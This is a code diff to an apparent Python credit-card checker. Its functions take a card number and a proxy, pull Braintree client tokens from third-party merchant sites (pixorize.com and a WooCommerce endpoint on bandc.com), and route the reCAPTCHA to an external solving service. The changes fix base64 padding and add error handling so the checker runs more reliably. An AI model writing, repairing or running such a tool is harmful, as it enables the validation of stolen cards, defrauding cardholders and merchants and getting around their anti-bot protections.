@@ -240,13 +240,21 @@ def check_braintree(cc, proxy=None):
         r = session.get('https://apitwo.pixorize.com/braintree/token', timeout=20)
         if r.status_code != 200:
             return "Failed to get Braintree token", "ERROR"
-        payload_encoded = r.json()['payload']['clientToken']
-        if isinstance(payload_encoded, bytes):     
-            payload_encoded = payload_encoded.decode('utf-8') 
-        decoded = base64.urlsafe_b64decode(payload_encoded + '=' * (-len(payload_encoded) % 4)).decode('utf-8')
+        token_data = r.json()
+        payload_encoded = token_data.get('payload', {}).get('clientToken')
+        if not payload_encoded:
+            return "No client token in response", "ERROR"
+
+        # --- FIX: ensure string and correct padding ---
+        if isinstance(payload_encoded, bytes):
+            payload_encoded = payload_encoded.decode('utf-8')
+        missing_padding = len(payload_encoded) % 4
+        if missing_padding:
+            payload_encoded += '=' * (4 - missing_padding)
+        decoded = base64.urlsafe_b64decode(payload_encoded).decode('utf-8')
         auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', decoded).group(1)
 
-        # 3. Solve captcha via external service (keep as in original)
+        # 3. Solve captcha via external service
         captcha_payload = {
             "anchor": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=ar&type=image&v=h7qt2xUGz2zqKEhSc8DD8baZ&theme=light&size=invisible&badge=bottomright&cb=vxofomi8lsu7"
         }
@@ -571,6 +579,12 @@ def check_braintree_mass(cc, proxy=None):
         data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
         resp = r.post('https://bandc.com/wp-admin/admin-ajax.php', headers=headers, data=data)
         enc = resp.json()['data']
+        # --- FIX: ensure string and correct padding ---
+        if isinstance(enc, bytes):
+            enc = enc.decode('utf-8')
+        missing_padding = len(enc) % 4
+        if missing_padding:
+            enc += '=' * (4 - missing_padding)
         dec = base64.b64decode(enc).decode('utf-8')
         auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
 
